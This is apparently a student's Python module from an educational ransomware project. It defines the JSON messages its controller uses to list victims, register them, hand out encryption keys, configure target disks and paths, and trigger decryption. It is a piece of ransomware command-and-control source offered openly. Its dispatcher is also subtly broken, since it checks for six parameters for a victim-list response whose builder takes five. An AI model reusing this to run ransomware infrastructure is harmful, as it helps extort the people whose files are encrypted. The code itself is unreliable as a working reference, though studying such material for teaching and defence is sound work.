# --------------------------------------------

# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : message

# --------------------------------------------
# Importations
# --------------------------------------------
import json
# --------------------------------------------
# Functions
# --------------------------------------------


MESSAGE_TYPE = {
    'LIST_REQ': 'LIST_VICTIM_REQ',
    'VICTIM': 'LIST_VICTIM_RESP',
    'LIST_END': 'LIST_VICTIM_END',
    'HIST_REQ': 'HISTORY_REQ',
    'HIST_RESP': 'HISTORY_RESP',
    'HIST_END': 'HISTORY_END',
    'CHGSTATE': 'CHANGE_STATE',
    'INITIALIZE': 'INITIALIZE_REQ',
    'KEY_RESP': 'INITIALIZE_KEY',
    'CONFIGURE': 'INITIALIZE_RESP',
    'CLOSE_TCP': 'GOOD_BYE'
}


def list_victim_req():
    list_victim_req = {
        'LIST_REQ': None
    }
    ljson = json.dumps(list_victim_req)

    return ljson

def list_victim_resp(id, os, disks, state, nb_files):
    list_victim_resp = {
        'VICTIM': id,
        'OS': os,
        'DISKS': disks,
        'STATE': state,
        'NB_FILES': nb_files
    }
    ljson = json.dumps(list_victim_resp)

    return ljson

def list_victim_end():
    list_victim_end = {
        'LIST_END': None
    }
    ljson = json.dumps(list_victim_end)

    return ljson

def history_req(id):
    history_req = {
        'HIST_REQ': id
    }
    hqjson = json.dumps(history_req)

    return hqjson

def history_resp(id, timestamp, state, nb_files):
    history_resp = {
        'HIST_RESP': id,
        'TIMESTAMP': timestamp,
        'STATE': state,
        'NB_FILES': nb_files
    }
    hrjson = json.dumps(history_resp)

    return hrjson

def history_end(id):
    history_end = {
        'HIST_END': id
    }
    hejson = json.dumps(history_end)

    return hejson

def change_state(id):
    change_state = {
        'CHGSTATE': id,
        'STATE': 'DECRYPT'
    }
    csjson = json.dumps(change_state)

    return csjson

def close_connexion():
    close_connexion = {
        'CLOSE_TCP': None
    }
    ccjson = json.dumps(close_connexion)

    return ccjson

def initialize_req(hash, os, disks):
    initialize_req = {
        'INITIALIZE': hash,
        'OS': os,
        'DISKS': disks
    }
    irjson = json.dumps(initialize_req)

    return irjson

def initialize_key(id, key, state):
    initialize_key = {
        'KEY_RESP': id,
        'KEY': key,
        'STATE': state
    }
    ikjson = json.dumps(initialize_key)

    return ikjson

def initialize_resp(id, disks, paths, file_exit, freq, key):
    initialize_resp = {
        'CONFIGURE': id,
        'SETTING': {
            'DISKS': disks,
            'PATHS': paths,
            'FILE_EXIT': file_exit,
            'FREQ': freq,
            'KEY': key,
        }
    }
    irjson = json.dumps(initialize_resp)

    return irjson

def get_message(select_msg, params=None):

    if select_msg.upper() == 'LIST_VICTIM_REQ':
        return list_victim_req()

    if select_msg.upper() == 'LIST_VICTIM_RESP':
        if len(params) != 6:
            return None
        return list_victim_resp(params[0], params[1], params[2], params[3], params[4], params[5])

    if select_msg.upper() == 'LIST_VICTIM_END':
        return list_victim_end()

    if select_msg.upper() == 'HISTORY_REQ':
        if len(params) != 1:
            return None
        return history_req(params[0])

    if select_msg.upper() == 'HISTORY_RESP':
        if len(params) != 4:
            return None
        return history_resp(params[0], params[1], params[2], params[3])

    if select_msg.upper() == 'HISTORY_END':
        if len(params) != 1:
            return None
        return history_end(params[0])

    if select_msg.upper() == 'CHANGE_STATE':
        if len(params) != 1:
            return None
        return change_state(params[0])

    if select_msg.upper() == 'INITIALIZE_REQ':
        if len(params) != 3:
            return None
        return initialize_req(params[0], params[1], params[2])

    if select_msg.upper() == 'INITIALIZE_KEY':
        if len(params) != 3:
            return None
        return initialize_key(params[0], params[1], params[2])

    if select_msg.upper() == 'CLOSE_TCP':
        return "Good Bye"

    if select_msg.upper() == 'INITIALIZE_RESP':
        if len(params) != 6:
            return None
        return initialize_resp(params[0], params[1], params[2], params[3], params[4], params[5])

def get_message_type(message):
    message = json.loads(message)
    first_key = list(message.keys())[0]
    return MESSAGE_TYPE[first_key]

def get_message_type_t(message):
    first_element = message[0]
    return MESSAGE_TYPE[first_element]